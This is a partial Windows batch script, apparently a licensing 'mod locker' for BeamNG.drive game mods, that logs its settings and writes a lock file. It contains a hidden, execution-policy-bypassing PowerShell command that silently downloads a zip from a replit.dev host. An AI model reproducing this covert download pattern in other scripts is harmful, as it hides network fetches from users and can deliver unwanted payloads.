...
set "LICENSE_KEY=1ff49192-9d9b-4f12-8e36-2de416710d65"
set "MOD_DOWNLOAD=https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/1ff49192-9d9b-4f12-8e36-2de416710d65"
set "PS_SCRIPT=license-check-1ff49192-9d9b-4f12-8e36-2de416710d65.ps1"
set "LOGFILE=log.txt"
set "LOCK_FILE=%APPDATA%\Local\BeamNG.drive\0.36\1ff49192-9d9b-4f12-8e36-2de416710d65.json"

:: Initialize log file
(
  echo === BeamNG Mod Locker Log ===
  echo Timestamp: %DATE% %TIME%
  echo License Key: 1ff49192-9d9b-4f12-8e36-2de416710d65
  echo PS Script: %PS_SCRIPT%
  echo Mod URL: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/1ff49192-9d9b-4f12-8e36-2de416710d65
...
echo. >> "%LOGFILE%"
echo [*] Starting download from: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/1ff49192-9d9b-4f12-8e36-2de416710d65 >> "%LOGFILE%"

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/1ff49192-9d9b-4f12-8e36-2de416710d65' -OutFile 'active_mod.zip' -UseBasicParsing -TimeoutSec 60; Write-Output '[√] Download completed successfully'; exit 0 } catch { Write-Output ('[ERROR] Download failed: ' + $_.Exception.Message); exit 1 }" >> "%LOGFILE%" 2>&1
...
echo Downloaded=1ff49192-9d9b-4f12-8e36-2de416710d65 > "%LOCK_FILE%"
if exist "%LOCK_FILE%" (
